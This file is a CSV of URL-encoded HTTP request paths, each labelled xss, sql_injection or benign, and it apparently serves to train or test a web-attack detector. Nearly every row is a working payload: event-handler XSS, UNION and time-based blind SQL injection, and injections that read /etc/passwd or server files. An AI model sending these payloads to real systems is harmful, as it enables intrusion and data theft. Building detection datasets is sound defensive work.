text,label
/api/v1/feedback?message=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Ccenter+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fcenter%3E,xss
/api/v1/feedback?message=%3Cmain+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmain%3E,xss
/api/v1/comments?text=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cli+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fli%3E,xss
/api/v1/feedback?message=%3Ctfoot+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Ftfoot%3E,xss
/api/v2/items/or+SLEEP%285%29%3D%27?key=API_KEY,sql_injection
/v1/profile?bio=%3Cprogress+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Fprogress%3E%3Cinput+id%3Dy+autofocus%3E,xss
/v1/search?q=%3Cform+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Fform%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/reviews?body=%3Cmath%3E,xss
/v1/profile?bio=%3Cdir+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fdir%3E,xss
/api/v2/comments/%3Cp+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fp%3E,xss
/api/v2/items/OR+x%3Dy--?key=API_KEY,sql_injection
/api/v1/login?username=%27+or+username+like+%27%25&password=pass,sql_injection
/api/v1/search?q=%29%29+waitfor+delay+%270%3A0%3A20%27+%2F%2A,sql_injection
/api/v1/feedback?message=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Chgroup+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fhgroup%3E,xss
/api/v2/comments/%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cabbr+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fabbr%3E,xss
/api/v1/search?q=%29%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--,sql_injection
/api/v2/search?q=%22-%22&key=API_KEY,sql_injection
/api/v1/login?username=ORDER+BY+26&password=pass,sql_injection
/api/v1/comments?text=%3Cbody+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fbody%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cframe+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fframe%3E,xss
/api/v1/comments?text=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cdel+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fdel%3E,xss
/api/v1/feedback?message=%3Cfigure+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ffigure%3E,xss
/api/v1/search?q=AND+7506%3D9091+AND+%28%275913%3D5913,sql_injection
/api/v1/reviews?body=%3Chead+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fhead%3E,xss
/v1/search?q=%3Cplaintext+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fplaintext%3E,xss
/api/v1/reviews?body=%3Cembed+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fembed%3E,xss
/api/v2/profile?id=%3Cvideo+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fvideo%3E,xss
/v1/profile?bio=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cvideo+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fvideo%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Ckbd+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fkbd%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Clabel+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Flabel%3E,xss
/api/v2/items/%27%2C%28select%2520if%28count%28%2A%29%21%3D-1%2Cbenchmark%283000000%2CMD5%281%29%29%2Cbenchmark%283000000%2CMD5%281%29%29%29%29%2F%2A?key=API_KEY,sql_injection
/v1/profile?bio=%3Cdiv+id%3D%22126%22%3E%3Cobject+id%3D%22x%22+classid%3D%22clsid%3ACB927D12-4FF7-4a9e-A169-56E4B8A75598%22%3E%3C%2Fobject%3E,xss
/api/v1/feedback?message=%3Ckbd+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fkbd%3E,xss
/api/v1/feedback?message=%3Cvideo+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fvideo%3E,xss
/api/v1/feedback?message=%3Crb+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Frb%3E,xss
/api/v2/comments/%3Col+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fol%3E%3Cinput+autofocus%3E,xss
/v1/orders?customer_id=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%23&status=active,sql_injection
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Ccite+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fcite%3E,xss
/api/v2/search?q=%22%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--&key=API_KEY,sql_injection
/api/v2/comments/%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Ctrack+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Ftrack%3E,xss
/api/v1/users?id=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520%2523,sql_injection
/api/v2/search?q=waitfor+delay+%2700%3A00%3A05%27--&key=API_KEY,sql_injection
/api/v2/search?q=admin%22+or+%221%22%3D%221&key=API_KEY,sql_injection
/api/v2/items/%29%29%29+waitfor+delay+%270%3A0%3A20%27+--?key=API_KEY,sql_injection
/api/v1/reviews?body=%3Cvideo+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fvideo%3E,xss
/v1/profile?bio=%3Cbig+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbig%3E,xss
/v1/orders?customer_id=exec%28%40s%29&status=active,sql_injection
/v1/orders?customer_id=%2B+SLEEP%2810%29+%2B+%27&status=active,sql_injection
/api/v1/feedback?message=%3Ccite+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fcite%3E,xss
/v1/profile?bio=%3Cbgsound+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbgsound%3E,xss
/api/v2/comments/%3Cp+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fp%3E,xss
/v1/search?q=%3Ci+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fi%3E,xss
/api/v1/reviews?body=%3Ccommand+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fcommand%3E,xss
/api/v2/comments/%3Coutput+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Foutput%3E,xss
/api/v1/comments?text=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Caside+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Faside%3E,xss
/api/v2/profile?id=%3Cruby+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fruby%3E,xss
/api/v2/profile?id=%3Cu+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fu%3E,xss
/v1/profile?bio=%3Cul+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Ful%3E,xss
/v1/search?q=%3Cbr+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fbr%3E,xss
/v1/search?q=%3Cscript%3Evar+request+%3D+new+XMLHttpRequest%28%29%3Brequest.open%28%27GET%27%2C+%27http%3A%2F%2Fhtml5sec.org%2Fxssme2%27%2C+false%29%3Brequest.send%28null%29%3Bif+%28request.status+%3D%3D+200%29%7Balert%28request.responseText.substr%28150%2C41%29%29%3B%7D%3C%2Fscript%3E,xss
/api/v1/comments?text=%3Clabel+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Flabel%3E,xss
/v1/profile?bio=%3Ctr+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Ftr%3E,xss
/v1/search?q=%3Clisting+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Flisting%3E,xss
/api/v2/comments/%3Cwbr+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fwbr%3E,xss
/api/v1/feedback?message=%3Cform+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fform%3E,xss
/api/v1/users?id=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2C3,sql_injection
/api/v1/feedback?message=%3Csummary+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fsummary%3E,xss
/api/v1/comments?text=%3Ctfoot+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftfoot%3E,xss
/v1/products/UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%23,sql_injection
/v1/products/ORDER+BY+4,sql_injection
/v1/profile?bio=%3Cvideo+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fvideo%3E,xss
/v1/search?q=%3Cmenu+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmenu%3E,xss
/api/v2/profile?id=%3Cselect+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fselect%3E,xss
/api/v2/profile?id=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Csource+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fsource%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cdir+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fdir%3E,xss
/api/v1/search?q=%22%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520%2F%2A,sql_injection
/api/v1/reviews?body=%3Cshadow+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fshadow%3E%3Cinput+autofocus%3E,xss
/api/v1/feedback?message=%3Ccode+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fcode%3E,xss
/v1/profile?bio=%3Cmarquee+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmarquee%3E,xss
/api/v2/profile?id=%3Cblink+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fblink%3E,xss
/api/v1/search?q=SLEEP%285%29%3D%22,sql_injection
/api/v2/profile?id=%3Capplet+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fapplet%3E,xss
/api/v1/comments?text=%3Cmenu+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fmenu%3E,xss
/api/v1/users?id=UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5,sql_injection
/api/v1/feedback?message=%3Cdata+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fdata%3E,xss
/api/v1/comments?text=%3Cpicture+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fpicture%3E,xss
/api/v1/users?id=%40var+select+%40var+as+var+into+temp+end+--,sql_injection
/api/v1/reviews?body=%3Cframeset+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fframeset%3E,xss
/v1/profile?bio=%3Clink+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Flink%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cbody+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fbody%3E,xss
/api/v1/comments?text=%3Crtc+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Frtc%3E,xss
/api/v2/profile?id=%3Ccol+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcol%3E,xss
/v1/search?q=%3Csvg%3E%3Cspan+onload%3Dalert%281%29%3E%3C%2Fspan%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Chtml+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fhtml%3E,xss
/v1/products/%22%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--,sql_injection
/api/v2/comments/%3Csection+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fsection%3E,xss
/api/v2/comments/%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cbutton+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fbutton%3E,xss
/api/v1/feedback?message=%3Cdel+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fdel%3E,xss
/api/v2/profile?id=%3Cbdi+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fbdi%3E,xss
/api/v1/search?q=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%23,sql_injection
/v1/search?q=%3Col+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fol%3E,xss
/api/v2/comments/%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cfieldset+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Ffieldset%3E,xss
/v1/search?q=%3Csub+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fsub%3E,xss
/api/v1/comments?text=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Ctitle+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Ftitle%3E,xss
/api/v2/comments/%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Ctextarea+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Ftextarea%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cform+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fform%3E,xss
/api/v1/feedback?message=%3Cvideo+oncanplay%3Dalert%281%29%3E%3Csource+src%3D%22validvideo.mp4%22+type%3D%22video%2Fmp4%22%3E%3C%2Fvideo%3E,xss
/v1/orders?customer_id=union+select+1%2Cload_file%28%27%2Fetc%2Fpasswd%27%29%2C1%2C1%2C1%3B&status=active,sql_injection
/v1/profile?bio=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cdt+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fdt%3E,xss
/api/v1/reviews?body=%3Ctemplate+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Ftemplate%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Cthead+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fthead%3E,xss
/api/v1/reviews?body=%3Cb+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fb%3E,xss
/api/v1/comments?text=%3Crp+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Frp%3E,xss
/v1/orders?customer_id=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%29%2520--&status=active,sql_injection
/api/v1/login?username=create+table+myfile+%28line+varchar%288000%29%29%22+bulk+insert+foo+from+%27c%3A%5Cinetpub%5Cwwwroot%5Cauth.asp%C3%A2%27%22+select+%2A+from+myfile%22--&password=pass,sql_injection
/api/v2/profile?id=%3Chtml+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fhtml%3E,xss
/v1/profile?bio=%3Ciframe+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fiframe%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Ctime+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Ftime%3E,xss
/api/v1/reviews?body=%3Cstrike+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fstrike%3E,xss
/v1/search?q=%3Ci+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fi%3E,xss
/api/v1/feedback?message=%3Ctr+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftr%3E,xss
/api/v2/comments/%3Cabbr+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fabbr%3E%3Cinput+autofocus%3E,xss
/api/v2/profile?id=%3Cfooter+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Ffooter%3E,xss
/api/v2/profile?id=%3Coutput+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Foutput%3E,xss
/api/v2/items/UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%23?key=API_KEY,sql_injection
/api/v2/comments/%3Cdd+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fdd%3E%3Cinput+autofocus%3E,xss
/api/v2/comments/%3Ctextarea+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftextarea%3E,xss
/api/v1/comments?text=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cform+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fform%3E,xss
/v1/products/ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29,sql_injection
/api/v2/items/and+%28select+substring%28%40%40version%2C3%2C1%29%29%3D%27S%27?key=API_KEY,sql_injection
/v1/search?q=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Clabel+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Flabel%3E,xss
/api/v2/comments/%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cparam+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fparam%3E,xss
/api/v2/profile?id=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cbig+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fbig%3E,xss
/v1/profile?bio=%3Cdir+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fdir%3E,xss
/api/v1/comments?text=%3Cem+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fem%3E,xss
/api/v1/login?username=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%23&password=pass,sql_injection
/api/v1/comments?text=%3Cem+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fem%3E,xss
/v1/search?q=%3Cdiv+id%3D%2269%22%3E%3Ccard+xmlns%3D%22http%3A%2F%2Fwww.wapforum.org%2F2001%2Fwml%22%3E%3Conevent+type%3D%22ontimer%22%3E%3Cgo+href%3D%22javascript%3Aalert%2869%29%22%2F%3E%3C%2Fonevent%3E%3Ctimer+value%3D%221%22%2F%3E%3C%2Fcard%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E%3Cdiv+id%3D%2270%22%3E%3Cdiv+style%3Dwidth%3A1px%3Bfilter%3Aglow+onfilterchange%3Dalert%2870%29%3Ex%3C%2Fdiv%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E%3Cdiv+id%3D%2271%22%3E%3C%2F%2F+style%3Dx%3Aexpression%5C28alert%2871%29%5C29%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E%3Cdiv+id%3D%2272%22%3E%3Cform%3E%3Cbutton+formaction%3D%22javascript%3Aalert%2872%29%22%3EX%3C%2Fbutton%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E%3Cdiv+id%3D%2273%22%3E%3Cevent-source+src%3D%22event.php%22+onload%3D%22alert%2873%29%22%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E%3Cdiv+id%3D%2274%22%3E%3Ca+href%3D%22javascript%3Aalert%2874%29%22%3E%3Cevent-source+src%3D%22data%3Aapplication%2Fx-dom-event-stream%2CEvent%3Aclick%250Adata%3AXXX%250A%250A%22+%2F%3E%3C%2Fa%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E%3Cdiv+id%3D%2275%22%3E%3Cscript%3C%7Balert%2875%29%7D%2F%3E%3C%2Fscript+%3C%2F%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E%3Cdiv+id%3D%2276%22%3E%3C%3Fxml-stylesheet+type%3D%22text%2Fcss%22%3F%3E%3C%21DOCTYPE+x+SYSTEM+%22test.dtd%22%3E%3Cx%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Ch1+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fh1%3E,xss
/v1/search?q=%3Cruby+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fruby%3E,xss
/api/v1/feedback?message=%3Cmulticol+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fmulticol%3E%3Cinput+autofocus%3E,xss
/v1/orders?customer_id=%29%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--&status=active,sql_injection
/api/v1/comments?text=%3Cbr+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbr%3E,xss
/api/v1/reviews?body=%3Cfieldset+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ffieldset%3E,xss
/api/v2/comments/%3Cimage+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fimage%3E%3Cinput+autofocus%3E,xss
/api/v2/comments/%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Ccol+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fcol%3E,xss
/api/v2/items/or+1%2F%2A?key=API_KEY,sql_injection
/api/v2/comments/%3Csub+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fsub%3E,xss
/v1/profile?bio=%3Cmath%3E%3Ca+xlink%3Ahref%3D%22%2F%2Fjsfiddle.net%2Ft846h%2F%22%3Eclick,xss
/api/v1/comments?text=%3Cnoembed+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fnoembed%3E,xss
/api/v2/comments/%3Ca+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fa%3E,xss
/api/v1/login?username=ORDER+BY+18&password=pass,sql_injection
/api/v2/comments/%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Ccommand+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fcommand%3E,xss
/api/v1/comments?text=%3Cfont+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ffont%3E,xss
/v1/search?q=%3Cfont+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Ffont%3E,xss
/api/v1/reviews?body=%3Chtml+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fhtml%3E,xss
/api/v1/feedback?message=%3Caside+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Faside%3E,xss
/api/v1/feedback?message=%3Capplet+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Fapplet%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/profile?id=177815,benign
/v1/profile?bio=%60-alert%281%29%22%3E%27onload%3D%22%60%3Csvg%2F1%3D%27,xss
/v1/profile?bio=%3Csmall+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fsmall%3E,xss
/api/v2/profile?id=%3Cnextid+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fnextid%3E,xss
/api/v2/profile?id=%3Cdir+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdir%3E,xss
